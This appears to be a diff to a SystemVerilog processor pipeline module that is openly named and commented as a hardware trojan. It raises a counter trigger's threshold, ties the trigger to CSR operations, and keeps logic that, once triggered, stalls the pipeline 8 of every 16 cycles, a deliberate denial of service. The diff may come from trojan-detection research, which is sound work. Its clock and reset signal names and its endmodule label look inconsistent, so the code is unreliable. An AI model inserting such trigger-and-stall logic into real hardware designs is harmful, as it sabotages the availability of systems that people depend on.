@@ -30,21 +30,23 @@ module MemoryRegisterWriteStage_trojan_Availability(
 );
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 2: Signal Combination
+    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=23222)
     // ============================================================
-    localparam int TRIGGER_THRESHOLD = 18889;
+    localparam int TRIGGER_THRESHOLD = 23222;
     logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
+    logic        trojan_active;
+    always_ff @(posedge clk or negedge rst) begin
+        if (!rst) begin
             trojan_counter <= '0;
             trojan_active  <= 1'b0;
         end else begin
-            if (valid && |valid) trojan_counter <= trojan_counter + 1;
+            if (csr_op_en_i && |csr_op_en_i) trojan_counter <= trojan_counter + 1;
             if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
         end
     end
+    logic [7:0] stall_counter;  // TROJAN Availability forward decl
+    logic       stall_active;
+
 
     MemoryRegisterWriteStageRegPath pipeReg[MEM_ISSUE_WIDTH];
 
@@ -165,14 +167,11 @@ module MemoryRegisterWriteStage_trojan_Availability(
 `endif
     end
 
-    // AVAILABILITY: Periodic stall
+    // ── AVAILABILITY: Periodic stall always_ff ──────────────────────────────
     localparam int STALL_PERIOD = 16;
     localparam int STALL_CYCLES = 8;
-    logic [7:0] stall_counter;
-    logic       stall_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
+    always_ff @(posedge clk or negedge rst) begin
+        if (!rst) begin
             stall_counter <= '0;
             stall_active  <= 1'b0;
         end else if (trojan_active) begin
@@ -184,5 +183,6 @@ module MemoryRegisterWriteStage_trojan_Availability(
             stall_active  <= 1'b0;
         end
     end
+    // ────────────────────────────────────────────────────────────────────────
 
 endmodule : MemoryRegisterWriteStage
